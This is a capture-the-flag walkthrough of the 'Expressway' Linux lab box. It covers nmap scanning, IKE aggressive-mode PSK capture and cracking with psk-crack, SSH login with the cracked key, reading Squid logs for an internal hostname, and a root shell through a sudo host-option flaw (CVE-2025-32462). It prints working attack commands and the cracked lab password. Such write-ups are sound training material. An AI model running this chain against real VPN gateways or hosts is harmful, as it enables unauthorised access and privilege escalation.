# Expressway

## Box Info

***

| OS    | Difficulty |
| ----- | ---------- |
| Linux | Easy       |

## 0x1 Nmap Scan

***

### TCP Scan

***

```bash
nmap -sV -sC 10.10.11.87
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 18:35 EEST
Nmap scan report for 10.10.11.87
Host is up (0.32s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

we try to scan all ports but just `ssh` is only open using TCP Scan

### UDP Scan

***

```bash
sudo nmap -sU -T4 10.10.11.87
```

```
PORT      STATE         SERVICE
2/udp     filtered      compressnet
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
500/udp   open          isakmp
682/udp   filtered      xfr
959/udp   filtered      unknown
3702/udp  filtered      ws-discovery
4500/udp  open|filtered nat-t-ike
4666/udp  filtered      edonkey
5632/udp  filtered      pcanywherestat
6050/udp  open|filtered x11
18373/udp open|filtered unknown
20217/udp filtered      unknown
20752/udp filtered      unknown
22055/udp open|filtered unknown
25931/udp filtered      unknown
31109/udp filtered      unknown
32931/udp filtered      unknown
49169/udp filtered      unknown
49188/udp filtered      unknown
49200/udp open|filtered unknown
```

we will notice **port 500** is open which associated with the **IKE** (Internet Key Exchange) service. This protocol is the foundation of IPsec VPNs, used to negotiate secure tunnels. This is our attack surface.

## 0x2 IKE-Scan

***

`ike-scan` probes IKE (ISAKMP) services (typically UDP/500 or UDP/4500 with NAT-T) to discover VPN gateways and fingerprint them (Vendor ID/backoff). Key features:

```bash
sudo ike-scan 10.10.11.87
```

```
10.10.11.87     Main Mode Handshake returned HDR=(CKY-R=d7fed0ff80bab75b) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

```

{% hint style="success" %}
* The target responded with a **Main Mode IKE handshake**. IKE is running.
* SA: `3DES / SHA1 / DH group 2 (modp1024) / Auth=PSK / Lifetime=28800s`. → Server uses PSK auth with older crypto parameters.
* Vendor IDs returned: **XAUTH** (implies additional username/password auth for remote-access) and **Dead Peer Detection v1.0**.
* `1 returned handshake; 0 returned notify` → one host responded with handshake; no notify messages.
* Next steps (with permission): capture packets with tcpdump, use `-aggressive --pskcrack` to extract PSK params for offline cracking (ethical/legal warning), and run fingerprinting (`-showbackoff` / VID patterns).
{% endhint %}

### Aggressive Scan

***

```bash
sudo ike-scan --aggressive --pskcrack=psk.out 10.10.11.87
```

![](<../.gitbook/assets/2025 09 21_19_54_25 Kali_Linux_ _VMware_Workstation.png>)

![](../.gitbook/assets/image.png)

### Crack PSK

***

```bash
psk-crack -d ~/wordlist/rockyou.txt psk.out
```

```
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 73da6b21b10d497e7bc121d2b7d814be265064a3
Ending psk-crack: 8045039 iterations in 5.740 seconds (1401687.07 iterations/sec)

```

## 0x3 Initial foothold

***

```bash
ssh ike@10.10.11.87 
```

```
ke@10.10.11.87's password: 
Last login: Sun Sep 21 17:04:15 BST 2025 from 10.10.16.75 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Sep 21 17:15:32 2025 from 10.10.16.73
ike@expressway:~$ ls
CVE-2025-32462.sh  user.txt
ike@expressway:~$ cat user.txt 

```

**We found something interest**

* **`CVE-2025-32462`** → can privilege user to root permission using `sudo -h`
* **`ike`** user is a member of proxy group
* **`PATH`** → has a multiple sudo account which default sudo path is `/usr/bin/sudo` and machine sudo path /`usr/local/bin/sudo` and non default is the first in path

### Finding One

***

![](<../.gitbook/assets/2025 09 21_20_17_26 Kali_Linux_ _VMware_Workstation.png>)

that's meaning if we use [`localhost`](http://localhost) with `sudo -h` we can get root permission

### Finding Two

***

we are a member in proxy group so this group often has permissions related to proxy services like `Squid`

```bash
ike@expressway:~$ ls -l /var/log/squid/
total 20
-rw-r----- 1 proxy proxy 4778 Jul 23 01:19 access.log.1
-rw-r----- 1 proxy proxy   20 Jul 22 19:32 access.log.2.gz
-rw-r----- 1 proxy proxy 2192 Jul 23 01:47 cache.log.1
-rw-r----- 1 proxy proxy  941 Jul 23 01:47 cache.log.2.gz
```

check first file

```bash
ike@expressway:~$ cat /var/log/squid/access.log.1

```

![](<../.gitbook/assets/2025 09 21_20_11_54 Kali_Linux_ _VMware_Workstation.png>)

that’s refer client tried to access an internal-only host named `offramp.expressway.htb` through the proxy

### Finding Three

***

we will use none default root path

<figure><img src="../.gitbook/assets/image 1.png" alt=""><figcaption></figcaption></figure>

## 0x4 Root

***

```bash
ike@expressway:~$ /usr/local/bin/sudo -h offramp.expressway.htb bash
```

<figure><img src="../.gitbook/assets/image 2.png" alt=""><figcaption></figcaption></figure>
